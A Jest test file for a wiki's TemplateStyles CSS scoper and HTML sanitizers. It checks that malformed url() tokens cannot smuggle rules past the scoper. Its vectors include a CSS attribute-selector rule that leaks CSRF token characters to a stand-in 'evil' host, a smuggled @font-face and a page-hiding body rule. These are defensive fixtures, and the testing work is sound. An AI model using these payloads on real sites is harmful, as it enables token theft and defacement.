/** @jest-environment node */
// Plan 415 review: vectors for the TemplateStyles scoper, judged by an independent CSS tokenizer. The oracle is
// lightningcss (a spec CSS tokenizer and parser, like the browsers'), run over what the scoper emits: every rule
// it finds must be confined to the article's root, and no at-rule but @media may be left. lightningcss is
// tailwind's own dependency (it is in node_modules, not in package.json); postcss walks its output.
import { transform } from "lightningcss";
import postcss from "postcss";
import { ARTICLE_STYLE_SCOPE, scopeTemplateStyles } from "~/lib/utils/scope-template-styles";
import {
  sanitizeHtml,
  sanitizeUserContent,
  sanitizeWikiArticleHtml,
  sanitizeWikiContent,
} from "~/lib/utils/sanitize-html";

const S = ARTICLE_STYLE_SCOPE;
const ROOT = S.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
const OPEN = '<style data-mw-deduplicate="x">';

interface BrowserView {
  selectors: string[];
  atRules: string[];
}

/** The selectors of every rule the browser would find in `css`, and every at-rule that is not @media. */
function browserView(css: string): BrowserView {
  const { code } = transform({ filename: "o.css", code: Buffer.from(css), errorRecovery: true });
  const root = postcss.parse(code.toString());
  const view: BrowserView = { selectors: [], atRules: [] };
  root.walk((node) => {
    if (node.type === "rule") view.selectors.push(...node.selectors.map((selector) => selector.trim()));
    else if (node.type === "atrule" && node.name !== "media") view.atRules.push(node.name);
  });
  return view;
}

/** A selector that can only match inside the article: it starts with the root, and no sibling combinator follows it directly. */
const confined = (selector: string): boolean =>
  new RegExp(`^${ROOT}(?![\\w-])`).test(selector) &&
  !new RegExp(`^${ROOT}(?:[:.#[][^\\s>+~]*)*\\s*[+~]`).test(selector);

describe("a bad-url token hides nothing from the scoper (CSS Syntax 4.3.6)", () => {
  it.each([
    ["a quote inside an unquoted url()", `.a{background:url(x"y);}body{display:none}.b{background:url(x"y)}`],
    ["the same behind a comment", `.a{background:url(x"y);}body{display:none}/*"*/)}`],
    ["a single quote", `.a{background:url(x'y);}body{display:none}.b{background:url(x'y)}`],
    ["an escaped function name", `.a{background:\\75 rl(x"y);}body{display:none}.b{background:url(x"y)}`],
    ["an upper-case function name", `.a{background:URL(x"y);}body{display:none}.b{background:url(x"y)}`],
    ["a url inside a selector", `.a:is(url(x"y)){color:red}body{display:none}.b:is(url(x"y)){color:red}`],
    [
      "a smuggled exfiltration rule",
      `.a{background:url(x"y);}input[name=csrf][value^=a]{background:url(https://evil/a)}.b{background:url(x"y)}`,
    ],
    [
      "a smuggled @font-face",
      `.a{background:url(x"y);}@font-face{font-family:q;src:url(https://evil/f)}.b{background:url(x"y)}`,
    ],
  ])("%s", (_name, css) => {
    const out = scopeTemplateStyles(css);
    const view = browserView(out);

    expect(out).toBe("");
    expect(view.selectors.filter((selector) => !confined(selector))).toEqual([]);
    expect(view.atRules).toEqual([]);
  });

  it.each([
    ["whitespace, then more than the closing paren", ".a{background:url(x y)}.b{color:red}"],
    ["an opening paren", ".a{background:url(x(y)}.b{color:red}"],
    ["a bad escape (a backslash and a newline)", ".a{background:url(x\\\ny)}.b{color:red}"],
    ["an escaped paren, then whitespace and more", ".a{background:url(x\\) y)}.b{color:red}"],
    ["a non-printable character", `.a{background:url(x\u0007y)}.b{color:red}`],
  ])("a bad url is not read as a url: %s", (_name, css) => {
    expect(scopeTemplateStyles(css)).toBe("");
  });

  it.each([
    ".a{background:url(x.png)}",
    ".a{background:url( x.png )}",
    '.a{background:url("x y.png")}',
    ".a{background:url( 'x\"y.png' )}",
    ".a{background:url(a\\29 b.png)}",
    ".a{background:url(a\\\"b.png)}",
    ".a{background:url(data-x.png)}",
    '.a{background:foo(x"y")}',
    '.a{background:xurl(x"y")}',
    '.a{background:-url(x"y")}',
  ])("a url the browser reads as written stays: %s", (css) => {
    expect(scopeTemplateStyles(css)).toContain(`${S} .a{`);
  });
});

describe("the other sanitizers are unchanged by the article's allowances", () => {
  const html = `${OPEN}.a{color:red}</style><center>c</center><font color="red">f</font><p>x</p>`;

  it.each([
    ["sanitizeWikiContent", sanitizeWikiContent],
    ["sanitizeUserContent", sanitizeUserContent],
    ["sanitizeHtml", sanitizeHtml],
  ])("%s still strips <style>, <center> and <font>", (_name, sanitize) => {
    const out = sanitize(html);

    expect(out).not.toContain("<style");
    expect(out).not.toContain("<center");
    expect(out).not.toContain("<font");
  });

  it("the article sanitizer keeps a scoped style", () => {
    expect(sanitizeWikiArticleHtml(`${OPEN}.a{color:red}</style><p>x</p>`)).toBe(
      `${OPEN}${S} .a{color:red}</style><p>x</p>`
    );
  });
});
